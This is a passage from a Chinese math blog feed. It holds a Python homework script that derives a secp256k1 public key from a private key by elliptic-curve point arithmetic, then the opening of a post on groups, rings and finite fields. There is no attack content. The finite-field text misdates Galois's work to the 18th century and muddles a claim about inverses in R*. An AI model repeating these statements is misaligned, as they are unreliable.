class="mord">8</span><span class="mord mathnormal">a</span><span class="mord">8</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">d</span><span class="mord">1</span><span class="mord">7</span><span class="mord mathnormal">b</span><span class="mord">4</span><span class="mord">4</span><span class="mord">8</span><span class="mord mathnormal">a</span><span class="mord">6</span><span class="mord">8</span><span class="mord">5</span><span class="mord">5</span><span class="mord">4</span><span class="mord">1</span><span class="mord">9</span><span class="mord">9</span><span class="mord mathnormal">c</span><span class="mord">4</span><span class="mord">7</span><span class="mord mathnormal">d</span><span class="mord">0</span><span class="mord">8</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">b</span><span class="mord">1</span><span class="mord">0</span><span class="mord mathnormal">d</span><span class="mord">4</span><span class="mord mathnormal">b</span><span class="mord">8</span></span></span></span></span></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="2"></td><td><pre>已知私钥为您的学号，求公钥</pre></td></tr><tr><td data-num="3"></td><td><pre>[115558381663906209150297993116070464229031829974553177032784681955324439750888, 84875200934012589315793426756669380005172249774350913639994928299122491983685]</pre></td></tr><tr><td data-num="4"></td><td><pre>'''</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#coding:utf-8</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">#欧几里得算法求最大公约数</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">def</span> <span class="token function">get_gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    k <span class="token operator">=</span> a <span class="token operator">//</span> b</pre></td></tr><tr><td data-num="9"></td><td><pre>    remainder <span class="token operator">=</span> a <span class="token operator">%</span> b</pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">while</span> remainder <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        a <span class="token operator">=</span> b </pre></td></tr><tr><td data-num="12"></td><td><pre>        b <span class="token operator">=</span> remainder</pre></td></tr><tr><td data-num="13"></td><td><pre>        k <span class="token operator">=</span> a <span class="token operator">//</span> b</pre></td></tr><tr><td data-num="14"></td><td><pre>        remainder <span class="token operator">=</span> a <span class="token operator">%</span> b</pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">return</span> b</pre></td></tr><tr><td data-num="16"></td><td><pre>    </pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token comment">#改进欧几里得算法求线性方程的 x 与 y</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">def</span> <span class="token function">get_</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        k <span class="token operator">=</span> a <span class="token operator">//</span> b</pre></td></tr><tr><td data-num="23"></td><td><pre>        remainder <span class="token operator">=</span> a <span class="token operator">%</span> b       </pre></td></tr><tr><td data-num="24"></td><td><pre>        x1<span class="token punctuation">,</span> y1 <span class="token operator">=</span> get_<span class="token punctuation">(</span>b<span class="token punctuation">,</span> remainder<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        x<span class="token punctuation">,</span> y <span class="token operator">=</span> y1<span class="token punctuation">,</span> x1 <span class="token operator">-</span> k <span class="token operator">*</span> y1          </pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">return</span> x<span class="token punctuation">,</span> y</pre></td></tr><tr><td data-num="27"></td><td><pre> </pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token comment">#返回乘法逆元</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token keyword">def</span> <span class="token function">yunsle</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token comment">#将初始 b 的绝对值进行保存</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">if</span> b <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        m <span class="token operator">=</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        m <span class="token operator">=</span> b</pre></td></tr><tr><td data-num="35"></td><td><pre>    flag <span class="token operator">=</span> get_gcd<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre> </pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token comment">#判断最大公约数是否为 1，若不是则没有逆元</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   </pre></td></tr><tr><td data-num="39"></td><td><pre>        x<span class="token punctuation">,</span> y <span class="token operator">=</span> get_<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>   </pre></td></tr><tr><td data-num="40"></td><td><pre>        x0 <span class="token operator">=</span> x <span class="token operator">%</span> m <span class="token comment">#对于 Python '%' 就是求模运算，因此不需要 '+m'</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token comment">#print (x0) #x0 就是所求的逆元</span></pre></td></tr><tr><td data-num="42"></td><td><pre>        <span class="token keyword">return</span> x0</pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Do not have!"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre> </pre></td></tr><tr><td data-num="46"></td><td><pre> </pre></td></tr><tr><td data-num="47"></td><td><pre>mod<span class="token operator">=</span><span class="token number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F</span></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token comment">#print(mod)</span></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token comment">#mod=23</span></pre></td></tr><tr><td data-num="50"></td><td><pre>a<span class="token operator">=</span><span class="token number">0</span></pre></td></tr><tr><td data-num="51"></td><td><pre>b<span class="token operator">=</span><span class="token number">7</span></pre></td></tr><tr><td data-num="52"></td><td><pre>G<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798</span><span class="token punctuation">,</span><span class="token number">0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token comment">#G=[3,10]</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token comment">#次数</span></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token comment">#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token comment">#私钥 k 为您的学号</span></pre></td></tr><tr><td data-num="57"></td><td><pre>k<span class="token operator">=</span>xxxxxxx</pre></td></tr><tr><td data-num="58"></td><td><pre>temp<span class="token operator">=</span>G</pre></td></tr><tr><td data-num="59"></td><td><pre> </pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token keyword">def</span> <span class="token function">get_result2</span><span class="token punctuation">(</span>tmp_list<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="61"></td><td><pre>  P<span class="token operator">=</span>tmp_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="62"></td><td><pre>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="63"></td><td><pre>    Q<span class="token operator">=</span>tmp_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="64"></td><td><pre>    <span class="token keyword">if</span> P <span class="token operator">==</span> Q<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="65"></td><td><pre>        aaa<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">*</span><span class="token builtin">pow</span><span class="token punctuation">(</span>P<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre>        bbb<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>P<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="67"></td><td><pre>        <span class="token keyword">if</span> aaa <span class="token operator">%</span> bbb <span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="68"></td><td><pre>            val<span class="token operator">=</span>yunsle<span class="token punctuation">(</span>bbb<span class="token punctuation">,</span>mod<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="69"></td><td><pre>            y<span class="token operator">=</span><span class="token punctuation">(</span>aaa<span class="token operator">*</span>val<span class="token punctuation">)</span> <span class="token operator">%</span> mod</pre></td></tr><tr><td data-num="70"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="71"></td><td><pre>            y<span class="token operator">=</span><span class="token punctuation">(</span>aaa<span class="token operator">/</span>bbb<span class="token punctuation">)</span> <span class="token operator">%</span> mod </pre></td></tr><tr><td data-num="72"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="73"></td><td><pre>        aaa<span class="token operator">=</span><span class="token punctuation">(</span>Q<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span>P<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="74"></td><td><pre>        bbb<span class="token operator">=</span><span class="token punctuation">(</span>Q<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span>P<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="75"></td><td><pre>        <span class="token keyword">if</span> aaa <span class="token operator">%</span> bbb <span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="76"></td><td><pre>            val<span class="token operator">=</span>yunsle<span class="token punctuation">(</span>bbb<span class="token punctuation">,</span>mod<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="77"></td><td><pre>            y<span class="token operator">=</span><span class="token punctuation">(</span>aaa<span class="token operator">*</span>val<span class="token punctuation">)</span> <span class="token operator">%</span> mod</pre></td></tr><tr><td data-num="78"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="79"></td><td><pre>            y<span class="token operator">=</span><span class="token punctuation">(</span>aaa<span class="token operator">/</span>bbb<span class="token punctuation">)</span> <span class="token operator">%</span> mod</pre></td></tr><tr><td data-num="80"></td><td><pre>    Rx<span class="token operator">=</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">-</span>P<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> Q<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token operator">%</span> mod</pre></td></tr><tr><td data-num="81"></td><td><pre>    Ry<span class="token operator">=</span><span class="token punctuation">(</span>y<span class="token operator">*</span><span class="token punctuation">(</span>P<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span>Rx<span class="token punctuation">)</span> <span class="token operator">-</span> P<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token operator">%</span> mod</pre></td></tr><tr><td data-num="82"></td><td><pre>    P<span class="token operator">=</span><span class="token punctuation">[</span>Rx<span class="token punctuation">,</span>Ry<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="83"></td><td><pre>  <span class="token keyword">return</span> P</pre></td></tr><tr><td data-num="84"></td><td><pre> </pre></td></tr><tr><td data-num="85"></td><td><pre> </pre></td></tr><tr><td data-num="86"></td><td><pre><span class="token keyword">def</span> <span class="token function">jieguo</span><span class="token punctuation">(</span>G<span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="87"></td><td><pre>    <span class="token keyword">global</span> list1</pre></td></tr><tr><td data-num="88"></td><td><pre>    temp<span class="token operator">=</span>G</pre></td></tr><tr><td data-num="89"></td><td><pre>    i<span class="token operator">=</span><span class="token number">2</span></pre></td></tr><tr><td data-num="90"></td><td><pre>    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token operator">&lt;=</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="91"></td><td><pre>            aaa<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">*</span><span class="token builtin">pow</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="92"></td><td><pre>            bbb<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>temp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="93"></td><td><pre>            <span class="token keyword">if</span> aaa <span class="token operator">%</span> bbb <span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="94"></td><td><pre>                val<span class="token operator">=</span>yunsle<span class="token punctuation">(</span>bbb<span class="token punctuation">,</span>mod<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="95"></td><td><pre>                y<span class="token operator">=</span><span class="token punctuation">(</span>aaa<span class="token operator">*</span>val<span class="token punctuation">)</span> <span class="token operator">%</span> mod</pre></td></tr><tr><td data-num="96"></td><td><pre>            <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="97"></td><td><pre>                y<span class="token operator">=</span><span class="token punctuation">(</span>aaa<span class="token operator">/</span>bbb<span class="token punctuation">)</span> <span class="token operator">%</span> mod</pre></td></tr><tr><td data-num="98"></td><td><pre>    </pre></td></tr><tr><td data-num="99"></td><td><pre>            Rx<span class="token operator">=</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">-</span>temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> mod</pre></td></tr><tr><td data-num="100"></td><td><pre>            Ry<span class="token operator">=</span><span class="token punctuation">(</span>y<span class="token operator">*</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span>Rx<span class="token punctuation">)</span> <span class="token operator">-</span> temp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> mod</pre></td></tr><tr><td data-num="101"></td><td><pre>            temp<span class="token operator">=</span><span class="token punctuation">[</span>Rx<span class="token punctuation">,</span>Ry<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="102"></td><td><pre>            i<span class="token operator">=</span>i<span class="token operator">*</span><span class="token number">2</span></pre></td></tr><tr><td data-num="103"></td><td><pre>    list1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="104"></td><td><pre>    rest_num<span class="token operator">=</span>num<span class="token operator">-</span>i</pre></td></tr><tr><td data-num="105"></td><td><pre>    <span class="token keyword">if</span> rest_num<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="106"></td><td><pre>        jieguo<span class="token punctuation">(</span>G<span class="token punctuation">,</span>rest_num<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="107"></td><td><pre> </pre></td></tr><tr><td data-num="108"></td><td><pre> </pre></td></tr><tr><td data-num="109"></td><td><pre>list1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="110"></td><td><pre>jieguo<span class="token punctuation">(</span>G<span class="token punctuation">,</span>k<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="111"></td><td><pre>list1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>G<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="112"></td><td><pre>result<span class="token operator">=</span>get_result2<span class="token punctuation">(</span>list1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="113"></td><td><pre> </pre></td></tr><tr><td data-num="114"></td><td><pre> </pre></td></tr><tr><td data-num="115"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="116"></td><td><pre> </pre></td></tr><tr><td data-num="117"></td><td><pre> </pre></td></tr><tr><td data-num="118"></td><td><pre> </pre></td></tr><tr><td data-num="119"></td><td><pre><span class="token comment">#print(temp)</span></pre></td></tr></table></figure><p>加以验证一下</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/10/2222c2da00c027df.png" alt="" /></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/10/dc7149b718fbde7c.png" alt="" /></p>
<p>总的来说就是求指数 x，转换为 log 进行离散计算</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>α</mi><mi>x</mi></msup><mo>=</mo><mi>β</mi><mi>m</mi><mi>o</mi><mi>d</mi><mi>P</mi></mrow><annotation encoding="application/x-tex">\alpha^x=\beta mod P
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span></p>
]]></content>
      <categories>
        <category>数论</category>
        <category>Math</category>
      </categories>
      <tags>
        <tag>数论</tag>
      </tags>
  </entry>
  <entry>
    <title>有限域-Galois Fields</title>
    <url>/number/math/%E6%9C%89%E9%99%90%E5%9F%9F-md/</url>
    <content><![CDATA[<p>有限域亦称伽罗瓦域（Galois Fields），是伽罗瓦于 18 世纪 30 年代研究代数方程根式求解问题时引出的概念。有限域在密码学、近代编码、计算机理论、组合数学等方面有着广泛的应用</p>
<p><a id="more"></a></p>
<p>设 f (x)，g (x) 为有限域 F_q 上的多项式。利用 Weil 关于特征和的定理，我们证明了当 q 足够大时，F_q 有元素 ξ 使 f (ξ),g (ξ) 同时为 F_q 的原根。特别，我们得到了某些二元二次方程 f (x,y)=0 有原根解。</p>
<p>这是有限域原根的问题，这里我主要讲解一下有限域上的多项式。</p>
<h2 id="群-环-域"><a class="anchor" href="#群-环-域">#</a> 群、环、域</h2>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/f08b0ece95b9b9c9.png" alt="" /></p>
<p>如果 &lt;F,+,・&gt; 是整环，|F|&gt;1，&lt;F-{0},・&gt; 是群，则 &lt; F,+,・&gt; 是域。故有限整环一定是域</p>
<p>简而言之，群只支持一种运算；环支持两种运算（乘法、加法）并拥有分配律；域支持加、减、乘、除。</p>
<p><span class="label warning">域是一个对加法和乘法封闭的集合，其中要求每个元素都有加法逆元，每个非零元素都有乘法逆元</span>若域 <em>F</em> 只包含有限个元素，则称为有限域，<span class="label warning">有限域中元素的个数称为有限域的阶</span>可以证明，<mark>有限域的阶必为素数的幂</mark></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>即有限域的阶可表示为</mtext><msup><mi>P</mi><mi>n</mi></msup><mtext>（</mtext><mi>p</mi><mtext>是素数也是有限域的【特征数】，</mtext><mi>n</mi><mtext>是正整数）</mtext><mspace linebreak="newline"></mspace><mtext>有限域通常记为</mtext><mi>G</mi><mi>F</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mi>n</mi></msup><mo stretchy="false">)</mo><mtext>表示</mtext><msup><mi>P</mi><mi>n</mi></msup><mtext>元的有限域</mtext></mrow><annotation encoding="application/x-tex">即有限域的阶可表示为 P^n（p 是素数也是有限域的【特征数】，n 是正整数）\\有限域通常记为 GF(p^n)表示P^n元的有限域
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9088319999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">限</span><span class="mord cjk_fallback">域</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">阶</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">示</span><span class="mord cjk_fallback">为</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mord cjk_fallback">（</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">素</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">限</span><span class="mord cjk_fallback">域</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">【</span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">征</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">】</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">正</span><span class="mord cjk_fallback">整</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">）</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">限</span><span class="mord cjk_fallback">域</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">常</span><span class="mord cjk_fallback">记</span><span class="mord cjk_fallback">为</span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">示</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">限</span><span class="mord cjk_fallback">域</span></span></span></span></span></p>
<p>最常用的域是 GF (P) 或 GF (2^n)。当 n=1 时，GF (P) 为素数域；当 p 为素数时，才能保证非零实数集 R * 中的所有元素都有加法和乘法逆元</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>有限域</mtext><mi>G</mi><mi>F</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mi>n</mi></msup><mo stretchy="false">)</mo><mtext>中的所有元素可以用</mtext><mo stretchy="false">{</mo><mn>1</mn><mo separator="true">,</mo><mi>x</mi><mo separator="true">,</mo><msup><mi>x</mi><mn>2</mn></msup><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msup><mi>x</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">}</mo><mtext>的线性组合来表示</mtext><mspace linebreak="newline"></mspace><mtext>即</mtext><mi>G</mi><mi>F</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mi>n</mi></msup><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><msup><mi>a</mi><mn>0</mn></msup><mo>+</mo><msup><mi>a</mi><mn>1</mn></msup><mi>x</mi><mo>+</mo><msup><mi>a</mi><mn>2</mn></msup><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msup><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup><msup><mi>x</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup><mi mathvariant="normal">∣</mi><msup><mi>a</mi><mi>i</mi></msup><mo>∈</mo><mi>G</mi><mi>F</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>i</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">}</mo><mtext>。</mtext></mrow><annotation encoding="application/x-tex">有限域 GF(p^n) 中的所有元素可以用\lbrace1, x, x^2, ......, x^{n-1}\rbrace的线性组合来表示\\即GF(p^n) = \lbrace a^0 + a^1 x + a^2 x^2 + ... + a^{n-1} x^{n-1} | a^i ∈ GF(p), i = 0, 1, 2, ..., n-1\rbrace。
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">限</span><span class="mord cjk_fallback">域</span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">素</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">用</span><span class="mopen">{</span><span class="mord">1</span><span 